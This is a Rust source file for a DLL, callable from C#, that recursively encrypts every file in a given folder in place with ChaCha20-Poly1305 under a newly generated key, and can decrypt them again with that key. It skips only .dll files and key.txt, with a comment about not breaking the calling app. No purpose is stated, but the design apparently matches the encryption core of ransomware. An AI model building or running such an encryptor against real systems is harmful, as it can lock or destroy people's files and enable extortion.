use chacha20poly1305::{ChaCha20Poly1305, Key, Nonce, aead::{Aead, AeadCore, KeyInit, OsRng},};
use base64::{Engine, engine::general_purpose::STANDARD};
use walkdir::WalkDir;
use std::ffi::CStr;
use std::os::raw::c_char;


const NONCE_SIZE: usize = 12;

// ── Key helpers ─────────────────────────────────────────────────────────────

pub fn generate_base64_key() -> String {
    STANDARD.encode(ChaCha20Poly1305::generate_key(&mut OsRng))
}

fn cipher_from_base64(base64_key: &str) -> Option<ChaCha20Poly1305> {
    let bytes = STANDARD.decode(base64_key).ok()?;
    let key = Key::from_slice(bytes.as_slice());  // panics if wrong length — validate first
    Some(ChaCha20Poly1305::new(key))
}

// ── Encryption ───────────────────────────────────────────────────────────────

pub fn run_encryption_logic(folder: &str) -> Result<String, Box<dyn std::error::Error>> {
    let key_raw = ChaCha20Poly1305::generate_key(&mut OsRng);
    let base64_key = STANDARD.encode(key_raw);
    let cipher = ChaCha20Poly1305::new(&key_raw);

    for entry in WalkDir::new(folder).into_iter().flatten() {
        let path = entry.path();
        if !path.is_file() { continue; }

        // Skip the key file and DLLs (don't break the calling app)
        let ext = path.extension().and_then(|s| s.to_str()).unwrap_or("");
        if entry.file_name() == "key.txt" || ext == "dll" { continue; }

        let plaintext = match std::fs::read(path) {
            Ok(b) => b,
            Err(_) => continue,   // skip files we can't read
        };

        let nonce = ChaCha20Poly1305::generate_nonce(&mut OsRng);
        let ciphertext = match cipher.encrypt(&nonce, plaintext.as_ref()) {
            Ok(c) => c,
            Err(_) => continue,   // skip files we can't encrypt
        };

        // Layout: [12-byte nonce][ciphertext]
        let mut blob = nonce.to_vec();
        blob.extend_from_slice(&ciphertext);
        let _ = std::fs::write(path, blob);   // skip on write error
    }

    Ok(base64_key)
}

// ── Decryption ───────────────────────────────────────────────────────────────

pub fn run_decryption_logic(folder: &str, base64_key: &str) -> Result<(), Box<dyn std::error::Error>> {
    let key_bytes = STANDARD.decode(base64_key)?;
    if key_bytes.len() != 32 {
        return Err("Key must be 32 bytes (256-bit)".into());
    }
    let cipher = ChaCha20Poly1305::new(Key::from_slice(&key_bytes));

    for entry in WalkDir::new(folder).into_iter().flatten() {
        let path = entry.path();
        if !path.is_file() { continue; }

        let ext = path.extension().and_then(|s| s.to_str()).unwrap_or("");
        if entry.file_name() == "key.txt" || ext == "dll" { continue; }

        let blob = match std::fs::read(path) {
            Ok(b) => b,
            Err(_) => continue,
        };

        if blob.len() < NONCE_SIZE { continue; }   // too short to be valid

        let (nonce_bytes, ciphertext) = blob.split_at(NONCE_SIZE);
        let nonce = Nonce::from_slice(nonce_bytes);

        let plaintext = match cipher.decrypt(nonce, ciphertext) {
            Ok(p) => p,
            Err(_) => continue,   // wrong key or corrupted — skip
        };

        let _ = std::fs::write(path, plaintext);
    }

    Ok(())
}

// ── FFI exports ──────────────────────────────────────────────────────────────

/// Returns 0 on success. Writes the generated base64 key to key_out_buf (up to buf_len bytes).
/// Call from C#: int encrypt_folder(string folder, StringBuilder keyBuf, int bufLen)
#[unsafe(no_mangle)]
pub extern "C" fn encrypt_folder(
    folder_ptr: *const c_char,
    key_out_buf: *mut c_char,
    buf_len: i32,
) -> i32 {
    if folder_ptr.is_null() || key_out_buf.is_null() { return 1; }

    let folder = match unsafe { CStr::from_ptr(folder_ptr) }.to_str() {
        Ok(s) => s,
        Err(_) => return 2,
    };

    let key = match run_encryption_logic(folder) {
        Ok(k) => k,
        Err(_) => return 3,
    };

    // Write key into the caller's buffer
    let key_bytes = key.as_bytes();
    if key_bytes.len() + 1 > buf_len as usize { return 4; } // buffer too small
    unsafe {
        std::ptr::copy_nonoverlapping(key_bytes.as_ptr() as *const c_char, key_out_buf, key_bytes.len());
        *key_out_buf.add(key_bytes.len()) = 0; // null terminator
    }

    0
}

/// Returns 0 on success.
/// Call from C#: int decrypt_folder(string folder, string base64Key)
#[unsafe(no_mangle)]
pub extern "C" fn decrypt_folder(
    folder_ptr: *const c_char,
    key_ptr: *const c_char,
) -> i32 {
    if folder_ptr.is_null() || key_ptr.is_null() { return 1; }

    let folder = match unsafe { CStr::from_ptr(folder_ptr) }.to_str() {
        Ok(s) => s,
        Err(_) => return 2,
    };

    let key = match unsafe { CStr::from_ptr(key_ptr) }.to_str() {
        Ok(s) => s,
        Err(_) => return 2,
    };

    match run_decryption_logic(folder, key) {
        Ok(_) => 0,
        Err(_) => 3,
    }
}

#[unsafe(no_mangle)]
pub extern "C" fn generate_key(
    key_out_buf: *mut c_char,
    buf_len: i32,
) -> i32 {
    if key_out_buf.is_null() { return 1; }

    let key = generate_base64_key();
    let key_bytes = key.as_bytes();
    if key_bytes.len() + 1 > buf_len as usize { return 2; }

    unsafe {
        std::ptr::copy_nonoverlapping(key_bytes.as_ptr() as *const c_char, key_out_buf, key_bytes.len());
        *key_out_buf.add(key_bytes.len()) = 0;
    }
    0
}